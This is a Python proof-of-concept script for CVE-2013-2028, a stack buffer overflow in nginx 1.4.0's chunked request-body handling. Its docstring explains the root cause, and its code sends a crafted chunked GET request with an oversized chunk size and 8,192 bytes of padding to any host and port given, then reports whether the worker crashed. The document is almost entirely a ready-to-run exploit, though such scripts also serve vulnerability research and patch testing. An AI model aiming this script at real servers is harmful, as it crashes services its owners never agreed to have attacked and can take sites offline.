#!/usr/bin/env python3
"""
PoC for CVE-2013-2028 - nginx 1.4.0 chunked Transfer-Encoding stack overflow.

Root cause: ngx_http_parse_chunked() in src/http/ngx_http_parse.c parses the
hex chunk-size into a *signed* off-like value. A chunk size with the high bit
set (e.g. very large hex) makes ctx->size negative. The discarded-body reader
ngx_http_read_discarded_request_body() then computes
    size = ngx_min(ctx->size, NGX_HTTP_DISCARD_BUFFER_SIZE /*4096*/)
With ctx->size negative, the ngx_min comparison (size_t) picks the negative
value as a huge unsigned number and recv()s it into a 4096-byte STACK buffer
-> stack-buffer-overflow.

Trigger: send a request with Transfer-Encoding: chunked and an oversized chunk
size line, then flood body bytes. Under ASan the worker aborts on the recv()
write past the 4096-byte stack buffer.

Usage: poc_cve_2013_2028.py [host] [port]
"""
import socket
import sys
import time

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80


def main() -> int:
    # The proven public trigger (m4drat / kitctf): a GET with chunked
    # Transfer-Encoding and NO body handler routes nginx into the
    # discard-request-body path -> ngx_http_parse_chunked(). The bytes after the
    # blank line are read as the chunk-size hex field; an enormous hex run drives
    # ctx->size (off_t) negative. ngx_http_read_discarded_request_body() then
    # ngx_min(ctx->size, 4096) keeps the negative value (treated unsigned) and
    # recv()s far past the 4096-byte stack buffer -> stack-buffer-overflow.
    headers = (
        "GET / HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        # chunk-size field: high-bit-set hex -> signed overflow to negative size
        "ffffffffffffffff\r\n"
    )
    payload = headers.encode() + b"A" * 8192  # flood past the 4096-byte buffer

    print(f"[*] Connecting to {HOST}:{PORT}")
    s = socket.create_connection((HOST, PORT), timeout=5)
    s.sendall(payload)
    print(f"[*] Sent {len(payload)} bytes (chunked overflow trigger)")
    try:
        s.settimeout(3)
        data = s.recv(4096)
        print(f"[*] Server replied {len(data)} bytes: {data[:80]!r}")
    except socket.timeout:
        print("[*] No reply (timeout) - worker likely aborted")
    except (ConnectionResetError, BrokenPipeError):
        print("[+] Connection reset - worker crashed")
    s.close()
    time.sleep(0.5)
    return 0


if __name__ == "__main__":
    sys.exit(main())
